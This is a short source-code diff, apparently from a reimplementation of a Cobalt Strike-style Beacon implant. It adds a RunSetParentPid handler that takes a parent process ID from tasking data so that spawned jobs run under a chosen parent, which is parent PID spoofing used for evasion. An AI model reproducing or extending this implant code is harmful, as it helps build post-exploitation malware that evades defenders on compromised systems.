@@ -14,6 +14,8 @@
 #include "identity.h"
 #include "utils.h"
 
+int gParentPid;
+
 void Spawn(char* data, int size, BOOL x86, BOOL ignoreToken)
 {
 	IdentityConditionalRevert(ignoreToken);
@@ -1292,7 +1294,7 @@ BOOL RunUnder(char* cmd, int cmdLength, STARTUPINFO* startupInfo, PROCESS_INFORM
 	return RunUnder_(&runUnderConfig, 0);
 }
 
-DWORD gParentPid;
+
 BOOL RunUnderParent(char* cmd, int cmdLength, STARTUPINFO* startupInfo, PROCESS_INFORMATION* processInfo, int creationFlags, BOOL ignoreToken)
 {
 	return RunUnder(cmd, cmdLength, startupInfo, processInfo, creationFlags, ignoreToken, gParentPid);
@@ -1437,4 +1439,17 @@ BOOL RunIsSameSessionAsCurrent(int pid)
 		return TRUE;
 
 	return sessionId == currentSessionId;
+}
+
+void RunSetParentPid(char* buffer, int length)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	gParentPid = BeaconDataInt(&parser);
+
+	if(gParentPid && !RunIsSameSessionAsCurrent(gParentPid))
+	{
+		LERROR("PPID %d is in a different desktop session (spawned jobs may fail). Use 'ppid' to reset.", gParentPid);
+		BeaconErrorD(ERROR_PARENT_PROCESS_NOT_IN_SAME_SESSION, gParentPid);
+	}
 }
